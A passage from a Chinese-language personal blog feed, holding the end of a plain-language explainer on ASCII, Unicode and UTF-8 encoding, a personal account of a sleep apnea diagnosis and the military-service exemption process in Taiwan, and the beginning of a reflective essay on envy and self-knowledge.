頁以前，所以整體來說還是更有效率的。</p><p>調整成這個新的系統以後，對於常使用英文的同學來說大幅減少了紙張的消耗，因為要寫的數字變少了。而對那些用中文筆談的同學來說，其實影響不大，畢竟大部分都還是用常見的中文字在聊天，跟以前一樣只需要 6 個數字即可。</p><p>總結一下，小明跟他們同學們創造的這一套編碼系統其實是很完整的，功能包含：</p><ol><li>成功符合了老師創造的規則，紙條上只有一連串的數字</li><li>涵蓋所有常用的字，而且未來可以再擴充</li><li>把每一個字對應到了一個獨一無二的數字</li><li>定義了該如何把數字轉成特定格式，讓其他同學方便解析又節省空間</li></ol><p>就這樣，小明跟他的同學們靠著自己發明的編碼系統，快樂地度過了在學校的時光。但他們不知道的是，原來在好幾年前的真實世界中，就已經有過類似的概念了。</p><h3 id="真實世界中的編碼"><a href="#真實世界中的編碼" class="headerlink" title="真實世界中的編碼"></a>真實世界中的編碼</h3><p>許多人應該都聽過一種說法，那就是「在電腦的眼中，所有的東西都只有 0 跟 1」，那你有沒有想過，在只有 0 跟 1 的世界中，該如何表示文字呢？</p><p>換句話說，該如何用數字來表示文字？</p><p>電腦科學家們對這個問題的解答與小明一樣：「建立一張轉換表！」</p><p>在 1960 年代，一個叫做 <strong>ASCII</strong> 的編碼系統（全名為 <strong>A</strong>merican <strong>S</strong>tandard <strong>C</strong>ode for <strong>I</strong>nformation <strong>I</strong>nterchange，<strong>美國標準資訊交換碼</strong>）誕生了。它並不是最早的編碼系統（例如說更早還有個叫 FIELDATA 的東西），不過卻是早期使用的最廣泛的。</p><p>這個編碼系統就跟小明做的事情一樣，把每一個文字都對應到了一個數字：</p><p><img src="/img/what-is-encoding-ascii-unicode-utf8-5fe55a98bee0/1__Gr5DBVUc0kuwroZc__b41SA.png"></p><p>因為電腦中都是用只有 0 跟 1 的二進位來表示數字，所以這個表格才會有一堆 0 跟 1。舉例來說，英文字母大寫 B 的直排是 100，橫排是 0010，因此它的編碼就是 1000010，轉換成十進位的話是 66。</p><p>而與故事中不同的是，上面這張編碼表的前兩排有一堆看起來不是文字的東西，這些叫做控制字元（Control character），你可以簡單想成那些字不是給人看的，而是給電腦看的。</p><p>舉例來說，編號為 7（0000111）的是一個叫做 BEL 的字元，電腦讀到這個字元之後，就會發出嗶嗶的聲音。透過這些控制字元，你可以「控制」電腦的部分行為。</p><p>而歷史後來的發展就跟小明的經歷一樣，ASCII 在建立的時候只考慮到了美國常用的字母，那中文怎麼辦？韓文怎麼辦？</p><p>於是每個國家都有了自己的編碼系統，例如說台灣在 1980 年代就設計了一種叫做 Big5 的編碼系統，來涵蓋各種中文字。而日本、韓國或其他國家也都有各自的編碼系統。</p><p>而這種各自為政的狀況，導致的結果就跟小明的故事如出一轍，電腦在解讀一串數字的時候，如果用的編碼系統跟預期中的不同，就會產生出亂碼。舉例來說，今天你用 Big5 編碼系統去編碼「你好」，產生的可能是 12324470，但這串字被 ASCII 解讀後可能是「? $8」這四個字元。</p><p>所以，要讓電腦看懂一串文字，除了原始資料以外，還必須要有編碼資訊，否則電腦只能用猜的，例如說猜你這串資料看起來很像 Big5 的格式，就用 Big5 來解碼。</p><p>在 1980 年末的時候，出現了一群人想要來統一這個亂象，想要做出一個普遍的（universal）編碼系統，容納世界上所有的文字，統一了標準以後，就不會有亂碼產生了。</p><p>而這個編碼系統，就叫做 Unicode。</p><p>Unicode 做的第一件事情很簡單，就是把每一個文字都對應到一個數字，專有名詞叫做 code point。例如說中文字的「立」，對應到的數字就是 7ACB（會有英文是因為十六進位的緣故），前面加上 U+ 來表示 Unicode：</p><p><img src="/img/what-is-encoding-ascii-unicode-utf8-5fe55a98bee0/1__sj__RTVcjmo0dNX5__PLeaPg.png"></p><p>所以只要看到「U+7ACB」，就知道這代表的是「Unicode 中的 code point 7ACB」。</p><p>把每一個文字都對應到數字以後，還有最後一個問題要解決，那就是該怎麼儲存在電腦中。最簡單暴力的方法就是小明也用過的補零，把每一個文字都用 4 個 byte（32 bit）來存，最輕鬆最容易，這種編碼方式就叫做 UTF-32。</p><p>所以電腦一看到這個檔案的編碼是 UTF-32，就知道說它應該把資料分成每 32 個 bit 一組，然後用 Unicode 的 code point 去把數字還原成文字。</p><p>而 UTF-32 的缺點顯而易見，就是太浪費空間了。英文字為了向下相容以前的 ASCII 系統，code point 是跟 ASCII 一樣的。例如說 ASCII 中的 A 是 65，在 Unicode 中也會是 65，這樣使用 Unicode 來編碼的英文字在舊電腦中也可以正常顯示，這就叫做向下相容。</p><p>而 ASCII 只需要 8 個 bit 就可以存一個字，現在換成 UTF-32 要用 32 個 bit，直接變成四倍的空間，也太不划算了吧？</p><p>於是，就有了另外一種編碼方式，叫做 UTF-8，它代表的意思跟小明最後設計出來的編碼系統是一樣的，那就是「儲存文字的長度是會變化的」，底下是維基百科上給的轉換表格：</p><p><img src="/img/what-is-encoding-ascii-unicode-utf8-5fe55a98bee0/1__nFJqVzseXyfkAd47RZkYew.png"></p><p>看起來很難懂對吧？但如果我跟你說，它其實就是這張表的進階版呢：</p><p><img src="/img/what-is-encoding-ascii-unicode-utf8-5fe55a98bee0/1__tfuP9X0PW8EAOwV68odGGA.png"></p><p>UTF-8 那張轉換表格在講的事情是一樣的，它是在定義說：「你本來的 code point 如果是 0 - 127，那就用一個 byte 來存就好。如果本來是 128 - 2047，就用兩個 byte 來存」。</p><p>而你會在表格中看到 Byte1、Byte2 最前面幾個數字是固定的，這就跟小明製作的表格一樣，目的是把前面最幾個數字當成「指示」。</p><p>舉例來說，電腦在看到一個 byte 的最左邊是 0 的時候，就知道這一個 byte 就代表一個字。在看到最左邊是 110 的時候，就知道這個 byte 要跟下一個 byte 一起看，才能表示完整的一個字。</p><p>就跟小明的表格一樣，最左邊是 0 代表是英文，最左邊是 1 代表它是 1-99 頁的中文，邏輯是完全一樣的。</p><p>而 UTF-8 的優點就是節省空間，與固定使用 32 bit 的 UTF-32 相比，對於常用的文字（英文）來說，只需要 8 個 bit 就好了。雖然說有些狀況需要用到 48 個 bit，但那是極少數的狀況，所以整體來說還是節省了許多空間。</p><p>因此現今，最廣泛使用的編碼方式就屬 UTF-8 為主了。</p><h3 id="所以，亂碼到底是什麼？"><a href="#所以，亂碼到底是什麼？" class="headerlink" title="所以，亂碼到底是什麼？"></a>所以，亂碼到底是什麼？</h3><p>亂碼就是你用 A 編碼系統來編碼，可是電腦卻用 B 系統來解碼，解出來的東西自然而然就會變成一堆看不懂的東西，就叫做亂碼。</p><p>現在基本上都是用同一種編碼系統，已經比較少看見亂碼了，但在十幾年前有些檔案是 Big5，此時如果用 UTF-8 來解讀，就會看見一堆亂碼，反之亦然。</p><p>電腦在打開一個文字檔案的時候，會從檔案內容去猜測編碼，而有些文字編輯器也可以自己選擇要用什麼編碼來顯示，例如說我用的 Sublime：</p><p><img src="/img/what-is-encoding-ascii-unicode-utf8-5fe55a98bee0/1__E0J7JImw5daIm7gRzioUcg.png"></p><p>而有些更有經驗的人，甚至能夠看見數字就大概猜出是什麼樣的編碼，例如說這篇：<a href="https://www.ptt.cc/bbs/Programming/M.1187367726.A.2B0.html">Re: [問題] 關於解碼的問題</a>。</p><h3 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h3><p>複習一下這一篇裡面提到的概念：</p><ol><li>要把文字儲存在電腦裡面時，必須要先編碼成數字</li><li>ASCII 是一套用 7 個 bit 來儲存文字的編碼系統，只支援英文、符號跟一些控制字元</li><li>Unicode 是一套容納了世界上所有文字的編碼系統，把每一個文字都對應到一個 code point，而實際儲存在電腦中又有不同的編碼方式。所以，只知道一個文字是用 Unicode 來編碼是沒用的，還需要知道怎麼儲存的</li><li>舉例來說，UTF-32 把每一個 code point 都用 32 個 bit 來存，簡單方便但是浪費空間</li><li>而 UTF-8 則是幫範圍不同的 code point 制定不同規則，用特定格式來儲存文字，有的用 8 個 bit 就好，有些會用到 48 個 bit，但以常用的字來說，節省了不少空間</li><li>亂碼就是在儲存跟顯示時使用了不同的編碼系統，可能導致的狀況，只要改用同一個編碼系統即可解決這個問題</li></ol><p>如果能理解這篇文章的所有內容，就能大致上理解編碼是怎麼一回事，Unicode 是什麼東西，UTF-8 又是什麼東西，以及為什麼會有亂碼，又該如何解決。</p><p>實際上，編碼的發展歷史遠比這篇文章講述的更為複雜，例如說在 ASCII 之後還出現了 ISO-8859 這個標準來存一些歐洲語系的字元（例如說 Æ），以及除了 UTF-32 以外還有 UTF-16，以及著名的 BOM（Byte-Order Mark）字元，這些比較細節的歷史在文章中都刻意沒有提及。</p><p>而 Unicode 這個規範其實也沒這麼簡單，在裡面還定義了一大堆東西跟一些方法論，以及一堆的專有名詞，這些也都沒有提到。甚至對於「一個字」的定義可能也比你想像中複雜一些。</p><p>這篇文章的目的是希望沒有技術背景的讀者們也能大概理解編碼是怎麼一回事，因此省略了許多我認為不影響理解的細節，以「讓讀者理解為什麼會這樣發展」為首要目標。如果內容有明顯錯誤，再麻煩留言跟我說。</p><p>最後，如果你對編碼的歷史有興趣，或是對實際上電腦到底要怎麼儲存，底下附上我在寫這篇文章以前參考過的一些資料，希望對你有幫助。</p><ol><li><a href="https://sites.google.com/site/lph760210/encoding">文字編碼二三事</a></li><li><a href="https://illya.tw/joel-on-software/the-absolute-minimum-every-software-developer-absolutely-positively-must-know-about-unicode-and-character-sets-no-excuses">每個軟體開發者都絕對一定要會的Unicode及字元集必備知識(沒有藉口！)</a></li><li><a href="https://speakerdeck.com/inndy/gong-cheng-shi-ding-yao-dong-de-text-encoding">工程師一定要懂的 Text Encoding</a></li><li><a href="http://utf8everywhere.org/zh-cn">UTF-8 遍地开花</a></li><li><a href="https://www.cnblogs.com/malecrab/p/5300503.html">细说：Unicode, UTF-8, UTF-16, UTF-32, UCS-2, UCS-4</a></li><li><a href="https://home.unicode.org/">Unicode 官網</a></li></ol><p>（附註：前幾段的標題靈感來自於 <a href="https://www.youtube.com/c/DcardTaiwan">Dcard 調查局</a>的影片，裡面常出現這種押韻的句子，認真想過之後發現寫那些文案的人真厲害）</p>]]></content>
      
      
      <categories>
          
          <category> 技術白話文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技術白話文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我與睡眠呼吸中止症——它跟你想的可能不同</title>
      <link href="/2022/02/21/sleep-apnea-and-i-176d197dbb4a/"/>
      <url>/2022/02/21/sleep-apnea-and-i-176d197dbb4a/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/sleep-apnea-and-i-176d197dbb4a/0__X6eMgSXnDNC8C9Vt.jpg"></p><p>不知道大家有沒有聽過「睡眠呼吸中止症」這個症狀？我的話，似乎以前就有聽過這個症狀，但直到幾年前才發現它跟我想的不一樣。</p><p>我原本想的是怎麼樣？就跟症狀的名稱一樣，不就是睡覺睡一睡呼吸會停止嗎？那我不可能有這個症狀吧，我晚上又不會因為呼吸不到空氣就突然驚醒，智慧型手錶也說我的睡眠品質 OK，沒什麼問題。</p><p>或許就是對這個疾病的錯誤認識，才導致我這麼晚才發現自己有這個疾病。</p><h3 id="意料之外的「驚喜」"><a href="#意料之外的「驚喜」" class="headerlink" title="意料之外的「驚喜」"></a>意料之外的「驚喜」</h3><p>2020 年 2 月，疫情還沒有完全爆發之前，我因為扁桃腺發炎的關係連續看了兩三次的醫生都看不好，維持著看醫生完吃藥，吃藥完沒事，停藥後過兩三天又復發的循環。</p><p>無奈之下只好從小診所轉往附近的雙和醫院，希望能在那邊有更進一步的發現，治好我的扁桃腺發炎。在那邊的耳鼻喉科看病時，醫生用了內視鏡檢查我的喉嚨，說發炎跟壓力也有關係，可能是最近壓力比較大才會一直好了又復發，要多注意一下。</p><p>除此之外，也順便問了我說：「那你平常會打呼嗎？」</p><p>會，而且是最吵人的那種。</p><p>打呼的人都是從別人那邊知道自己會打呼的。以前在當兵的時候，有天早上我周遭的鄰兵在討論昨天晚上的奇怪聲音，「你們有聽到昨天那個唧唧唧的聲音嗎？聽起來像是磨牙，但我試好久都不知道那種聲音怎麼發出來的」、「有啊，還有打呼的聲音，超大聲」、「對啊，超級吵的」</p><p>接著我說：「有嗎，我怎麼都沒聽到」</p><p>我想，兇手是誰已經很明顯了，打呼加磨牙，絕對是最吵的那種。</p><p>醫生說剛剛在看內視鏡的時候，發現我的扁桃腺比較肥大，可能會有睡眠呼吸中止症的問題，跟我說可以去睡眠中心排個檢查測測看。我覺得做個檢查也無妨，當天就去排了檢查，因為那時候還沒開始上班，所以隨叩隨到，大概過了兩三天就接到醫院的通知，問我當天晚上可不可以去做檢查。</p><p>2020 年 3 月，我就去做了睡眠檢查。</p><p>睡眠檢查是這樣的，簡單來說就是在醫院睡一個晚上，大約九點半左右要報到，報到之後填個資料量個血壓跟身高體重，就可以準備開始睡覺了。</p><p>醫院會準備一個病房給你，跟一般的病房差不多，接著為了要偵測你的各種數據，在睡覺前會在你身上貼上一大堆線，鼻子也會戴一個東西來偵測呼吸的狀況，為了數據的準確性，在頭上會塗一些腦波膏，腳跟胸也都會貼一些東西。</p><p>如果半夜想上廁所的話，會教你怎麼把線拆掉再裝回去，真的不行的話就是按鈴請護理師過來（真的辛苦他們了），不一定要九點半就睡，但因為檢查要睡滿一段時間才行，所以不建議太晚睡，我的話則是十點左右就睡了。</p><p>因為身上黏了一大堆東西，翻身時也很明顯有線在干擾，怕線被弄掉導致數字不準確，我就沒什麼翻身，睡的也不算太好。大概半夜兩點左右醒來一次，繼續睡以後五點多又醒來，再來就睡不太著了，一直到快六點會被叫起來，檢查就到這邊告一個段落。</p><p>因為頭上有塗腦波膏會弄到頭髮（滿黏的），所以可以選擇在醫院盥洗完再離開，而我的話則是直接回家盥洗。</p><p>我整個檢查都是在中和的雙和醫院做的，那邊一個晚上看起來最多可以排 4 到 5 個人左右，要先去掛號看耳鼻喉科或其他相關的科別才能排睡眠檢查，基本上全額健保給付，自費的部分好像是 200 元左右，但那是因為要買一個一次性的戴在鼻子上偵測呼吸的東西。</p><p>過了兩週之後回醫院看報告，在衡量睡眠呼吸中止症時有一個指標叫做 AHI（Apnea–Hypopnea Index，睡眠呼吸中止指數），基本上是每小時內睡眠呼吸中止的次數，5 以內算是正常，5<del>15 輕度，15</del>30 中度，高於 30 就是重度。</p><p>而醫生嚇到了，我也嚇到了，因為我測出來的 AHI 是 60，突破天際。</p><p>從那一刻開始，我才在醫生的指導下認識這個症狀。</p><h3 id="睡眠呼吸中止症是什麼？"><a href="#睡眠呼吸中止症是什麼？" class="headerlink" title="睡眠呼吸中止症是什麼？"></a>睡眠呼吸中止症是什麼？</h3><p>其實大方向就跟我開頭說的一樣，睡覺時呼吸中止，而根據成因分成不同類別，最常見的是阻塞型的睡眠呼吸中止症，是因為上呼吸道塌陷導致呼吸道被堵住，然後就吸不到空氣了。</p><p>而我自己覺得的重點是：<strong>中止的時候你完全不會知道</strong>。</p><p>這一切都是你的大腦（或是腦幹，我不確定，總之是腦）在處理的，吸不到口氣幾秒以後會開始缺氧，你的大腦就會發現，接著就會強迫你的身體開始再呼吸，因此整個晚上都處於一直缺氧然後強迫呼吸的循環之中，但是你不會醒來，所以你不知道。</p><p>這一切的一切你都沒有感覺。</p><p>會造成的影響是早上醒來時可能沒什麼精神或是會想睡覺（但這不是大家都會這樣嗎？所以我才說沒感覺），而我覺得最可怕的是這是一種慢性疾病，長期下來會增加高血壓、中風等等些心血管疾病的機率，也會影響記憶力。</p><p>「睡夢中的殺手」，這個對於睡眠呼吸中止症的形容一點都不為過。</p><p>所以我覺得除了睡眠檢查以外，你很難知道自己有睡眠呼吸中止症，因為你自己完全沒有病識感。</p><p>再來講回之前看醫生時提到的打呼，打呼大概是最有效能發現這個症狀的途徑了，打呼的成因就是呼吸道阻塞所以才發出鼾聲，而睡眠呼吸中止症的狀況就是打呼打一打之後，會完全沒聲音（因為呼吸中止了），接著又突然大吸一口氣之後開始打呼（大腦強迫呼吸），一直循環這個流程。</p><p>如果你的枕邊人有這種現象或是很常打呼的話，強烈建議去醫院排個睡眠檢查。做過睡眠檢查以後，我就不相信智慧手錶的睡眠檢測了，那些都太淺了，在你身上接一堆線跟儀器才是真的檢查。</p><h3 id="治療"><a href="#治療" class="headerlink" title="治療"></a>治療</h3><p>第一種治療方式顯而易見，就是從成因去下手。</p><p>有些人的成因是因為太胖，減肥後會比較好，而我的話是因為扁桃腺肥大，所以切掉以後可能會比較好。說「可能」是因為這也無法保證，搞不好還有其他因素導致了這個結果，不過切掉後至少應該能改善就是了。</p><p>第二種治療方式跟戴眼鏡一樣，有戴就會好，沒戴就跟之前一樣。</p><p>這個方法叫做陽壓呼吸器，簡單來說就是在臉上戴個面罩，旁邊會有一台機器不斷送空氣進來，強迫你把呼吸道打開，就不會睡眠中止了。而這一台機器通常都要個五萬以上，是一筆不小的開銷。</p><p>我的話因為暫時不想動刀，所以選擇了後者，陽壓呼吸器。因為有很多病人可能會戴不慣，所以我挑了一天晚上再來醫院做一次睡眠檢查，這次戴著呼吸器做，一方面也是測試看看自己習不習慣，另一方面則是看看戴了以後可以改善多少。</p><p>過幾天去拿報告以後，戴了呼吸器之後 AHI 變成 1 還是 2 吧，總之是個很正常的數字，證明呼吸器確實能幫助改善。因此，當天就決定要買那個呼吸器了，它長這個樣子，一台是五萬多：</p><p><img src="/img/sleep-apnea-and-i-176d197dbb4a/1__cqgJbKP1dItWSm3FIm8DEA.jpeg"></p><p>剛開始戴的幾次，到了早上不知道是因為心理作用還是真的有差，我都會覺得精神好像不錯，皮膚的一些過敏也好了很多，但隨著戴的次數變多，可能漸漸習慣了，所以沒什麼特別的感覺。</p><p>不過有個很明顯的差別是有戴的時候通常七八點都會自然醒，而且醒來時精神是真的比較好一點。</p><p>但因為側躺的時候呼吸器可能會沒戴好導致漏氣，所以大部份時候都只能正躺，說實在的有時候會不太舒服，我就會翻來覆去睡不著，就會把呼吸器給拿掉。</p><p>不像眼鏡一樣，你拿掉就看不到，你不戴呼吸器一樣睡得著，而且白天醒來也沒有太大的差別，所以到了後期有沒有戴對我自身的感覺來說，其實差異不大，但從之前睡眠檢查的結果中就可以知道，其實不戴的話對身體是有傷害的。</p><h3 id="再次檢查"><a href="#再次檢查" class="headerlink" title="再次檢查"></a>再次檢查</h3><p>2020 年 3 月時我做了睡眠檢查，大概差不多那時候就買了呼吸器，開始戴著它睡覺，而隔一年半後，2021 年 12 月時，我又去做了一次檢查。</p><p>故事是這樣的，我每年都會使用教召查詢系統，看看自己有沒有中獎，在 2021 年年底時我依照慣例去查了，中獎了，隔年的三月要去教召。</p><p>接著，我開始在網路上查詢一些相關的資訊，無意間發現了這一篇：<a href="https://www.ptt.cc/bbs/Militarylife/M.1564489315.A.EBC.html">Re: [問題] 睡眠呼吸中止可以免召嗎？</a>，才知道原來睡眠呼吸中止症是可以免召的，根據法規中的<a href="https://law.moj.gov.tw/LawClass/LawAll.aspx?pcode=F0040018">體位區分標準</a>，被分在神經系統中的 180 項次，AHI &gt; 30 者即是免役體位：</p><p><img src="/img/sleep-apnea-and-i-176d197dbb4a/1__cGEeIJqeiVLunFID4jtUFA.png"></p><p>以我一個已經當過兵的人來說，除了申請免召以外，還可以申請「轉免役體位」，申請通過之後就變成免役了，之後再也不會被教召，這一篇 PTT 的文章寫得很清楚：<a href="https://www.ptt.cc/bbs/Militarylife/M.1638411545.A.B7F.html">[哈拉] 教召核免&amp;退伍後備軍人轉免役體位</a></p><p>因為距離上次做睡眠檢查已經一年半了，因此查詢過相關資料過後，我決定自己去三總汀州院區掛號排睡眠檢查，三總沒有專門的睡眠科，而是由耳鼻喉科、精神科跟神經內科來看診，我掛到的是精神科的醫師。</p><p>進診間時我直接跟醫生說明了狀況，說以前做過，結果是重度（AHI 60），後來有買了陽壓呼吸器進行治療，現在因為兵役的關係想再做一次檢查。</p><p>醫生說我運氣很好，一般來說排隊要排四個月以後了，但他剛好有個病人本來排了可是後來沒有要去，就空出來了，於是就排定我 12&#x2F;20 的時候去三總內湖院區做檢查。</p><p>由於之前已經做過一次檢查，因此這次對流程已經熟悉很多，有要去三總檢查的話要注意一下，晚上九點半報到就真的是九點半睡眠中心才會開門，早到的話要額外找地方坐一下，建議差不多時間抵達就好，不需要早到太多。</p><p>之前在雙和醫院做檢查時我睡的病房沒有對外窗，燈一關起來整個都是黑的，不太習慣，這次去三總醫院的有窗戶，但空調的風口剛好對著臉那邊吹，其實睡得不是很好，我一樣差不多十點就睡了，睡到兩點醒來，再度睡著以後四點又醒來一次，然後就睡不太著了。</p><p>整個檢查一樣是差不多早上六點結束，整體流程跟之前在雙和醫院其實差不多。</p><p>過了兩週以後去看報告，一樣是重度，AHI 是 55，而醫生有說比較好的是血氧濃度最低到 89%，算是比較好的了（缺氧沒這麼嚴重），之前有病人測到 70 幾趴的，就很有可能睡一睡就猝死了。</p><p>接著醫師開了診斷證明書，上面就寫說阻塞型睡眠呼吸中止症，AHI 是 55。</p><h3 id="申請轉免役體位以及免召"><a href="#申請轉免役體位以及免召" class="headerlink" title="申請轉免役體位以及免召"></a>申請轉免役體位以及免召</h3><p>因為申請轉免役體位之後還需要一些時間，所以如果已經有被教召到的話，需要額外再辦理免召，否則還是要去教召。</p><p>而我的處境比較尷尬一點，我是 2022 年 1 月初拿到診斷證明書，3 月要去教召，可是還沒收到教召令，所以要嘛就是等收到教召令以後一起去辦，要嘛就是跑兩趟，我選擇了後者。</p><p>新北市的後備指揮部在土城，一個不是很好到達的地方，到那邊以後直接跟他說要辦轉免役體位就好，記得要帶退伍令（我的是結訓令）、診斷證明書還有身分證。</p><p>接著就是填個申請單，然後把資料交給承辦人員，承辦人員會說明一些注意事項，例如說申請轉免役體位如果通過，就會發一張免役令之類的，儘管我有當過兵，好像就會變成沒當過一樣，有些公司如果需要退伍令的話我會變得給不出來（不過我也沒差就是了，我待過的公司沒有人看這個）。</p><p>也說明了我剛剛提到的，收到教召令以後還要再跑一趟的注意事項，也有講說之後可能會被通知要去複檢之類的，不過根據我查到的資料，只要診斷證明書是某幾間特定醫院開的，就不用複檢，這也是為什麼我直接跑去三總做檢查。關於這點，有些區公所的網頁寫得比較清楚，例如<a href="https://www.tnsouth.gov.tw/News_Content_table.aspx?n=16945&s=5841245">台南市南區區公所</a>。</p><p>總之，整個流程大概五分鐘左右就整個辦完了，速度滿快的，承辦人員態度也很好，說明得也很細心。</p><p>接著 2 月初的時候收到教召令，家人幫我再跑一次後指部，到那邊以後沒有直接核准，而是說要醫官看一下，可以的話再來送資料（或是用郵寄的），當天晚上我就接到電話說醫官那邊看過沒問題了，可以核准，隔天就把資料寄過去。</p><p>最後，在 2 月底的時候接到區公所的電話，說要去公所拿免役證明書（我也不知道為什麼不是直接寄來家裡），於是就特地跑一趟去拿，拿到之後就代表變成免役身份了，後來順便打電話去後指部問免召的辦理結果，說已經辦好了，申請免役的大地遊戲就到這邊告一個段落。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>雖然說我目前是以戴呼吸器為主，但日後有機會可能還是會想動刀，畢竟現在年輕，一兩天不戴呼吸器也不至於怎麼樣，但老了以後就不知道了；雖然說動刀不一定能根治，但至少可以改善這個狀況，至少沒戴的時候 AHI 不會這麼高。</p><p>自從知道了睡眠呼吸中止症以後，我就很推薦周遭的親朋好友找時間去做一下睡眠檢查，尤其是知道自己會打呼的人，去測一下才是最準確的，看看自己的睡眠狀況怎麼樣。</p><p>睡眠檢查要排好一陣子，建議大家可以先去掛號預約一下，然後慢慢排隊，找時間去醫院睡一個晚上，就能夠知道自己的睡眠狀況以及有沒有睡眠呼吸中止症。</p><p>會想寫這篇除了記錄自己的經歷以外，也想提高大家對於這個疾病的認識，不要像我之前一樣有錯誤認知，或許就能早點察覺這個狀況。除此之外，也紀錄了兵役相關的申請流程跟結果，讓其他跟我一樣是重度的朋友們參考。</p><p>如果你看完之後有什麼相關的問題想跟我討論，都可以在底下留言，或是透過<a href="https://www.facebook.com/huli.blog">臉書</a>找到我。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>矛盾大對決</title>
      <link href="/2022/02/02/know-yourself-8ac86e6ca2b9/"/>
      <url>/2022/02/02/know-yourself-8ac86e6ca2b9/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/know-yourself-8ac86e6ca2b9/0__iQHikzWJki__0yUtY.jpg"></p><p>有些想法其實原本不打算寫出來的，至於原因嘛，應該是因為不想讓別人看到這一面吧。或是說，當有些事情我覺得是我自己的問題的時候，就會不想寫出來。</p><p>但另一方面我又覺得寫出來之後自己會比較好過一點，就有種「我連這個都做得到了，還有什麼可以阻擋我」的感覺。不過與此同時，我還在猶豫有些想法要不要寫出來，畢竟當你知道這邊已經是個超過一萬人追蹤，身邊也有朋友跟同事在看的部落格的時候，這裡就不再是樹洞了。</p><p>2021 年，總覺得大多數時候都是在疑惑中度過。其實有時候我很好奇，有些人是不是對自己沒有一丁點的懷疑？以我自己來說，我依舊還是偶爾會懷疑自己的能力，是不是能夠配得上我現在的位置，對於工作上或生活上的某些決定，也會懷疑自己這樣做是不是正確的。</p><p>我很好奇其他人是怎麼想的，是真的對自己有百分之百的自信，還是只是沒有把那一面展露出來？</p><p>來談談標題，這個標題其實我想表達的只有「矛盾」兩字而已。前陣子我發了一篇<a href="/2021/10/29/wannabe-f24dca839d27/">《想變成的模樣》</a>，裡面提到我想成為的樣子：低調的強者、把規模做小跟降低物慾。</p><p>但我開始懷疑起自己所寫下的東西，是不是真的。</p><p>有一種情緒在我以往的人生中很少出現，但近幾年卻越來越常，常到一個我已經無法忽視的地步了，叫做「嫉妒」。</p><p>我有認真想過這種情緒的起源是什麼，為什麼會有這種情緒出現，其中一個可能性是：「不夠好的自己」，因為覺得自己本來可以做到 90 分，但是只做到 60 分，而我看見其他人做到 90 分，就會覺得「自己明明可以做到那樣，但為什麼做不到？」，於是開始羨慕嫉妒起了做到的那個人。</p><p>或也可能是另外一種，真的是嫉妒他人的情緒：「我覺得他明明就沒那麼厲害，為什麼可以過得比我好」（<a href="https://twitter.com/TinyDenny/status/1474409099831951366">來源</a>）</p><p>前者聽起來像是有點完美主義，要把自己做到最好，後者則是純粹的嫉妒別人，無論是哪一種，都是我五六年前想像不到自己會有的樣子。</p><p>前幾天的某個時刻，我才突然意識到「認識自己」並不是一次性的，並不是說你在 18 歲時覺得自己真正認識自己以後，就這樣定了。因為所謂的「自己」是會改變的，所以「認識自己」是一個永無止盡的過程，可能 18 歲時認識的程度是 80 分，過了一年變成 90 或是 70，就算到了 100 分，也不能保證往後都是 100 分。</p><p>因為自己會改變，所以必須不斷重新認識自己。</p><p>雖然說我知道「堅定地看著自己」似乎就不會在意其他人，但不得不說這真的滿困難的。</p><p>而我也在想所謂的羨慕與嫉妒產生的瞬間，是否就代表你對某個目標是有慾望的？舉例來說，假設聽到某個朋友因為投資之類的大賺一筆，財富自由了，那我會覺得羨慕，想說：「哇，好棒啊」</p><p>而會有這個情緒，是不是因為我也想變成那樣？那如果我也想變成那樣，是不是就跟我之前所提到對金錢沒有這麼大的慾望相互違背了？會不會其實我內心深處也是那樣的人，渴求財富自由，但我壓抑著這個慾望，假裝自己不是？</p><p>還是說我真的不是那種人，只是受到周遭環境影響，才有了羨慕的想法？</p><p>不過無論如何，我覺得最難受的還是「意識到真實的自己跟想像中的自己不同」，多數時候我可能都在抗拒，說著「這不是我」，而不是坦然接受自己跟自己想的不同。看來有時候對自己誠實是件難事，因為連我都搞不清楚怎樣算是誠實了。</p><p>同樣是在那篇文章，我說了我想開那種「我家巷口屌打」的雞排店，不需要變成連鎖店，不需要全世界知名，只要在我家巷口很有名就好。以前我也說過我想把規模做小，我不想做大，因為我覺得做大以後可能會失去一些很寶貴的東西。</p><p>但我最近開始重新思考這個問題，我這樣做的目的是什麼？會不會到頭來只是我自以為是的無病呻吟，其實做大根本沒什麼不好？會不會這其實是必經的過程？</p><p>舉例來說，像我的程式教學平台 Lidemy，如果真的是為了學生好，那似乎做大以後才會有更多資源，例如說更多的學生投入，就會有更多錢，就能產生品質更好的課程，找到更多的企業合作，才能產生正向的循環。要把整個產業做大，才能整個提升起來。</p><p>那為什麼我會抗拒這種循環？</p><p>以前我有寫過一篇，裡面在講我不知道「知足」跟「畫地自限」的差別在哪裡。做到某個程度就停止，這叫做知足常樂，還是畫地自限？是因為不想前進而把自己困住，還是覺得這樣就足夠了，而不再前進？仔細想想的話，這問題的答案似乎在於自身，看自己是否真的因為這樣就能滿足。</p><p>我想，對我來說，最大的困難大概是我自己也不知道這問題的答案。大多數時候我認為這樣就足夠了，所以我不想繼續做大，但如果真的是這樣，那看到其他人的成就時的那種羨慕與嫉妒的感覺，又是從何而來呢？</p><p>這篇文章是少數時間跨度較大的文章，上面那些寫完以後過了大概兩個多月，有了一些新的想法。</p><p>想到了一個把自己做大的額外好處，就是影響力。當你越有錢或是越有身分地位的時候，通常都能發揮更大的影響力，如果能夠善用這些影響力，是不是就能讓社會變得更好一些？</p><p>例如說如果我沒有存款又背了一堆債，在碰到無良雇主違反勞基法時，我可能也沒辦法檢舉他，因為那代表我會失去這份唯一的收入來源，也不一定找得到下一份工作，所以我只能繼續被欺壓下去。</p><p>但若是我今天經濟穩定，並沒有這種困擾，我大可搜集證據以後直接離職，順手檢舉公司違反勞基法。又或者，假設我看到某個國小要出國比賽但沒有公司願意贊助，而我已經財富自由衣食無慮，就能夠贊助他們出國比賽，幫助他人達成夢想。</p><p>或是再舉一個例子，假設有些人很明顯就在騙錢，我也掌握了證據，如果我是個無名小卒，那我出來爆料不一定會有人相信，但若是我有了一定的身份地位或是追蹤者，就能發揮自己的影響力，把它用在好的地方。</p><p>雖然說要幫助他人，較高的社會地位與寬